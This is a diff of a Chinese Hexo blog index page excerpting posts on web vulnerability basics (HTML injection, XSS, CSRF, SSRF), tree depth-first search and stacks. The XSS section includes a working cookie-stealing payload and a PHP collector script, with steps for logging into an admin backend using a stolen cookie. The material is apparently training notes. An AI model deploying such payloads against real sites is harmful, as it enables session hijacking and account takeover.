@@ -7,7 +7,277 @@
     error: 'Copy error',
     noSupport: 'The browser does not support'
   }
-} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">98</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">16</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">18</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/19/XSS/">XSS</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-19</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">web安全漏洞</a></span><div class="content"><h3 id="XSS绕过过滤"><a href="#XSS绕过过滤" class="headerlink" title="XSS绕过过滤"></a>XSS绕过过滤</h3><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>如果过滤()和[]，则</p>
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">103</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">16</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">18</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/">web漏洞基本类型</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-04</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><h1 id="HTML注入"><a href="#HTML注入" class="headerlink" title="HTML注入"></a>HTML注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com?input&#x3D;&lt;h1&gt;key&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/html%E6%B3%A8%E5%85%A5.png" alt="html注入"></p>
+<p>把原有背景用白色覆盖，在上面加上自己的代码【将密码发给黑客的数据库】</p>
+<h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><h3 id="修复点"><a href="#修复点" class="headerlink" title="修复点"></a>修复点</h3><ol>
+<li>输入点</li>
+<li>输出点</li>
+</ol>
+<h3 id="修复函数"><a href="#修复函数" class="headerlink" title="修复函数"></a>修复函数</h3><p>用了之后htmlspecialchars()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com?input&#x3D;&lt;h1&gt;key&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>显示</p><h1>key</h1><p></p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h3><p>黑客向服务器提交一个请求【带有XSS代码】，服务器后台php处理这段代码【包括XSS代码】，然后服务器后台将处理好的页面发给黑客【包括XSS异常情况】。</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>黑客向服务器提交一个请求【带有XSS代码】，服务器将请求【包括XSS代码】存储到数据库里【所以当时不会有反应】，当下次访问此数据库对象时，会发生XSS异常情况。</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>不发给服务器，仅在浏览器端操作。当存在document.url，document.write等属性时。</p>
+<h4 id="例子：获取留言板管理员的cookie"><a href="#例子：获取留言板管理员的cookie" class="headerlink" title="例子：获取留言板管理员的cookie"></a>例子：获取留言板管理员的cookie</h4><p>首先写一个getCookie.php，内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(file_put_contents(<span class="string">"cookie.txt"</span>,<span class="string">'Cookie:'</span>.$_GET[<span class="string">'cookie'</span>],<span class="string">'Location:'</span>.$_GET[<span class="string">'durl'</span>],FILE_APPEND))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在留言板内输入</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="built_in">document</span>.location.href=<span class="string">"http://127.0.0.1/getCookie.php?cookie="</span>+</span><br><span class="line">    <span class="built_in">document</span>.cookie+</span><br><span class="line">    <span class="string">"&amp;durl="</span>+</span><br><span class="line">    <span class="built_in">document</span>.url<span class="string">"   </span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时当管理员点开此留言时，他的url和cookie就会被发送到cookie.txt。</p>
+<p>我们通过url，使用cookie quick manager等插件修改cookie来登入管理员后台。</p>
+<h1 id="CSRF（cross-site-request-forgery）跨站请求伪造"><a href="#CSRF（cross-site-request-forgery）跨站请求伪造" class="headerlink" title="CSRF（cross-site request forgery）跨站请求伪造"></a>CSRF（cross-site request forgery）跨站请求伪造</h1><ol>
+<li>黑客了解过一个页面1后，自己写了一个文件，里面主要代码为表单的提交，表单中包含页面1里你想要修改的数据。</li>
+<li>黑客挂一个链接，链接到此页面。用户点击后，黑客即能利用用户的权限来实现一些东西【比如修改用户本人的密码】</li>
+</ol>
+<p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/csrf.png" alt="csrf"></p>
+<h1 id="SSRF（Server-side-request-forgery）服务器端请求伪造"><a href="#SSRF（Server-side-request-forgery）服务器端请求伪造" class="headerlink" title="SSRF（Server-side request forgery）服务器端请求伪造"></a>SSRF（Server-side request forgery）服务器端请求伪造</h1><p>黑客利用服务器A作为跳板去访问服务器B。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<h2 id="内网IP端口存活测试"><a href="#内网IP端口存活测试" class="headerlink" title="内网IP端口存活测试"></a>内网IP端口存活测试</h2><p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/ssrf.png" alt="ssrf"></p>
+<p>其中ssrf_curl.php的代码是</p>
+<p><img src="/2020/05/04/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/ssrfphp.png" alt="ssrfphp"></p>
+<p>其中关于curl的有关内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.runoob.com&#x2F;php&#x2F;php-ref-curl.html</span><br></pre></td></tr></table></figure>
+
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/">树的深度优先搜索</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-03</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8E%E6%95%B0%E5%AD%A6/">计算机与数学</a></span><div class="content"><h1 id="树的深度优先搜索"><a href="#树的深度优先搜索" class="headerlink" title="树的深度优先搜索"></a>树的深度优先搜索</h1><h2 id="图论的一些概念"><a href="#图论的一些概念" class="headerlink" title="图论的一些概念"></a>图论的一些概念</h2><p>有向图：所有的边都是有向边</p>
+<p>无向图：所有的边都是无向边</p>
+<p>混合图：都有</p>
+<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/1.jpg" alt="1"></p>
+<p>出度：这个结点出去几条线</p>
+<p>入度：这个结点进去几条线</p>
+<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/2.jpg" alt="2"></p>
+<p>通路：任意两点互相连通</p>
+<p>回路：一条通路的起始点v1和终止点vn相同</p>
+<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/3.jpg" alt="3"></p>
+<p>树：没有简单回路的连通无向图</p>
+<p>有向树：一种特殊的树，边是有向的，且满足：</p>
+<ol>
+<li>有且只有一个结点入向为0，这个结点称为根</li>
+<li>除根以外的所有结点，入度都为1.从树根到任一结点有且只有一条有向通路</li>
+</ol>
+<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/4.jpg" alt="4"></p>
+<h2 id="前缀树的构建和查询"><a href="#前缀树的构建和查询" class="headerlink" title="前缀树的构建和查询"></a>前缀树的构建和查询</h2><p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/5.jpg" alt="5"></p>
+<p>可以在叶子结点上添加此单词的解释</p>
+<h3 id="一些特殊情况"><a href="#一些特殊情况" class="headerlink" title="一些特殊情况"></a>一些特殊情况</h3><ol>
+<li>还没有到叶子结点，单词就结束了。【比如entire和entirely】此时要判断此非叶子结点是否为单词，若不是则字典里无此单词。</li>
+<li>搜索到叶子结点，仍无此单词，则字典里无此单词。</li>
+<li>搜索到一半，未到叶子结点，被查单词也有未匹配的字母，但下一个结点也无法匹配。则字典里无此单词。</li>
+</ol>
+<h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><p>这种前缀树的查找即属于<strong>深度优先搜索</strong></p>
+<h2 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h2><p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/6.jpg" alt="6"></p>
+<p>使用“栈”来遍历前缀树</p>
+<p><img src="/2020/05/03/%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/7.jpg" alt="7"></p>
+<blockquote>
+<p>第 1 步，将初始结点 110 压入栈中。<br>第 2 步，弹出结点 110，搜出下一级结点 123、879、945 和 131。<br>第 3 步，将结点 123、879、945 和 131 压入栈中。<br>第 4 步，重复第 2 步和第 3 步弹出和压入的步骤，处理结点 123，将新发现结点 162 和 587 压入栈中。<br>第 5 步，处理结点 162，由于 162 是叶子结点，所以没有发现新的点。第 6 步，重复第 2 和第 3 步，处理结点 587，将新发现结点 681 压入栈中。<br>……<br>第 n-1 步，重复第 2 和第 3 步，处理结点 131，将新发现结点 906 压入栈中。<br>第 n 步，重复第 2 和第 3 步，处理结点 906，没有发现新的结点，也没有更多待处理的结点，整个过程结束。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 使用栈来实现深度优先搜索</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfsByStack</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;(); </span><br><span class="line">    <span class="comment">// 创建堆栈对象，其中每个元素都是TreeNode类型</span></span><br><span class="line">  stack.push(root);    <span class="comment">// 初始化的时候，压入根结点</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (!stack.isEmpty()) &#123;  <span class="comment">// 只要栈里还有结点，就继续下去</span></span><br><span class="line">  </span><br><span class="line">  TreeNode node = stack.pop();  <span class="comment">// 弹出栈顶的结点</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (node.sons.size() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 已经到达叶子结点了，输出</span></span><br><span class="line">    System.out.println(node.prefix + node.label);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 非叶子结点，遍历它的每个子结点</span></span><br><span class="line">    Iterator&lt;Entry&lt;Character, TreeNode&gt;&gt; iter </span><br><span class="line">      = node.sons.entrySet().iterator();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 注意，这里使用了一个临时的栈stackTemp</span></span><br><span class="line">    <span class="comment">// 这样做是为了保持遍历的顺序，和递归遍历的顺序是一致的</span></span><br><span class="line">    <span class="comment">// 如果不要求一致，可以直接压入stack</span></span><br><span class="line">    Stack&lt;TreeNode&gt; stackTemp = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">    <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">      stackTemp.push(iter.next().getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stackTemp.isEmpty()) &#123;</span><br><span class="line">      stack.push(stackTemp.pop());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="用什么数据结构构建前缀树？"><a href="#用什么数据结构构建前缀树？" class="headerlink" title="用什么数据结构构建前缀树？"></a>用什么数据结构构建前缀树？</h2><blockquote>
+<p>我们可以设计一个 TreeNode 类，表示有向树的结点和边。这个类需要体现前缀树结点最重要的两个属性。</p>
+<ul>
+<li><p>这个结点所代表的字符，要用 label 变量表示。</p>
+</li>
+<li><p>这个结点有哪些子结点，要用 sons 哈希映射表示。之所以用哈希，是为了便于查找某个子结点（或者说对应的字符）是否存在。</p>
+<p>另外，我们还可以用变量 prefix 表示当前结点之前的前缀，用变量 explanation 表示某个单词的解释。和之前一样，为了代码的简洁，所有属性都用了 public，避免读取和设置类属性的代码。</p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 前缀树的结点</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">char</span> label;  <span class="comment">// 结点的名称，在前缀树里是单个字母</span></span><br><span class="line">  <span class="keyword">public</span> HashMap&lt;Character, TreeNode&gt; sons = <span class="keyword">null</span>; <span class="comment">// 使用哈希映射存放子结点。哈希便于确认是否已经添加过某个字母对应的结点。</span></span><br><span class="line">  <span class="keyword">public</span> String prefix = <span class="keyword">null</span>;   <span class="comment">// 从树的根到当前结点这条通路上，全部字母所组成的前缀。例如通路b-&gt;o-&gt;y，对于字母o结点而言，前缀是b；对于字母y结点而言，前缀是bo</span></span><br><span class="line">  <span class="keyword">public</span> String explanation = <span class="keyword">null</span>;  <span class="comment">// 词条的解释</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 初始化结点</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">TreeNode</span><span class="params">(<span class="keyword">char</span> l, String pre, String exp)</span> </span>&#123;</span><br><span class="line">   label = l;</span><br><span class="line">   prefix = pre; </span><br><span class="line">   explanation = exp;</span><br><span class="line">   sons = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>说到这里，你可能会好奇，为什么只有结点的定义，而没有边的定义呢？实际上，这里的有向边表达的是父子结点之间的关系，我把这种关系用 sons 变量来存储父结点。<br>需要注意的是，我们需要动态地构建这棵树。每当接收一个新单词时，代码都需要扫描这个单词的每个字母，并使用当前的前缀树进行匹配。如果匹配到某个结点，发现相应的字母结点并不存在，那么就建立一个新的树结点。这个过程不好理解，我也写了几行代码，你可以结合来看。其中，str 表示还未处理的字符串，parent 表示父结点。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; 处理当前字符串的第一个字母</span><br><span class="line">char c &#x3D; str.toCharArray()[0];</span><br><span class="line">TreeNode found &#x3D; null;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 如果字母结点已经存在于当前父结点之下，找出它。否则就新生成一个</span><br><span class="line">if (parent.sons.containsKey(c)) &#123;</span><br><span class="line">  found &#x3D; parent.sons.get(c);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  TreeNode son &#x3D; new TreeNode(c, pre, &quot;&quot;);</span><br><span class="line">  parent.sons.put(c, son);</span><br><span class="line">  found &#x3D; son;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/02/%E6%A0%88/">栈</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/">数据结构与算法之美</a></span><div class="content"><h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>一句话：后进者先出，先进者后出。</p>
+<p>当某个数据集合只涉及在一端的插入和删除数据，并且满足后进先出、先进后出的特性，我们就应该首选“栈”这种数据结构。</p>
+<h2 id="栈的实现"><a href="#栈的实现" class="headerlink" title="栈的实现"></a>栈的实现</h2><ul>
+<li><p>顺序栈：用数组实现。</p>
+</li>
+<li><p>链式栈：用链表实现</p>
+</li>
+</ul>
+  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基于数组实现的顺序栈</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayStack</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> String[] items;  <span class="comment">// 数组</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> count;       <span class="comment">// 栈中元素个数</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n;           <span class="comment">//栈的大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化数组，申请一个大小为n的数组空间</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayStack</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.items = <span class="keyword">new</span> String[n];</span><br><span class="line">    <span class="keyword">this</span>.n = n;</span><br><span class="line">    <span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 入栈操作</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">push</span><span class="params">(String item)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 数组空间不够了，直接返回false，入栈失败。</span></span><br><span class="line">    <span class="keyword">if</span> (count == n) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 将item放到下标为count的位置，并且count加一</span></span><br><span class="line">    items[count] = item;</span><br><span class="line">    ++count;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 出栈操作</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 栈为空，则直接返回null</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 返回下标为count-1的数组元素，并且栈中元素个数count减一</span></span><br><span class="line">    String tmp = items[count-<span class="number">1</span>];</span><br><span class="line">    --count;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="栈的时间、空间复杂度分析"><a href="#栈的时间、空间复杂度分析" class="headerlink" title="栈的时间、空间复杂度分析"></a>栈的时间、空间复杂度分析</h2><h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p>在入栈是、出栈时，只需要1-2个临时变量存储空间，所以空间复杂度为：<strong>O(1)</strong>。</p>
+<blockquote>
+<p>注意，这里存储数据需要一个大小为 n 的数组，并不是说空间复杂度就是 <strong>O(n)</strong>。因为，这 n 个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要<strong>额外</strong>的存储空间。</p>
+</blockquote>
+<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>入栈、出栈只涉及个别操作，时间复杂度为：<strong>O(1)</strong>。</p>
+<h2 id="支持动态扩容的顺序栈"><a href="#支持动态扩容的顺序栈" class="headerlink" title="支持动态扩容的顺序栈"></a>支持动态扩容的顺序栈</h2><p><img src="/2020/05/02/%E6%A0%88/%E5%8A%A8%E6%80%81%E6%89%A9%E5%AE%B9%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" alt="动态扩容示意图"></p>
+<h3 id="【动态扩容栈】时间复杂度分析"><a href="#【动态扩容栈】时间复杂度分析" class="headerlink" title="【动态扩容栈】时间复杂度分析"></a>【动态扩容栈】时间复杂度分析</h3><p><img src="/2020/05/02/%E6%A0%88/%E5%8A%A8%E6%80%81%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6.jpg" alt="动态时间复杂度"></p>
+<p>假设开始时栈的大小为K：</p>
+<ol>
+<li>K次时间复杂度为O(1)的simple-push</li>
+<li>1次时间复杂度为O(K)的扩容</li>
+<li>（K-1）次时间复杂度为O(1)的simple-push【为啥是K-1不是K ？？？】</li>
+<li>1次时间复杂度为O(2K)的扩容</li>
+<li>…………</li>
+</ol>
+<p>按图示方法均摊，可得均摊时间复杂度为：O(1)。</p>
+<h2 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h2><h3 id="栈在函数调用里的应用"><a href="#栈在函数调用里的应用" class="headerlink" title="栈在函数调用里的应用"></a>栈在函数调用里的应用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   int a &#x3D; 1; </span><br><span class="line">   int ret &#x3D; 0;</span><br><span class="line">   int res &#x3D; 0;</span><br><span class="line">   ret &#x3D; add(3, 5);</span><br><span class="line">   res &#x3D; a + ret;</span><br><span class="line">   printf(&quot;%d&quot;, res);</span><br><span class="line">   reuturn 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int add(int x, int y) &#123;</span><br><span class="line">   int sum &#x3D; 0;</span><br><span class="line">   sum &#x3D; x + y;</span><br><span class="line">   return sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/02/%E6%A0%88/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8.jpg" alt="函数调用"></p>
+<p>我的理解：</p>
+<ul>
+<li>声明一个变量时【res=0】就相当于把数据压入栈中，而调用这个变量时【res=a+ret】就相当于将数据取出栈。</li>
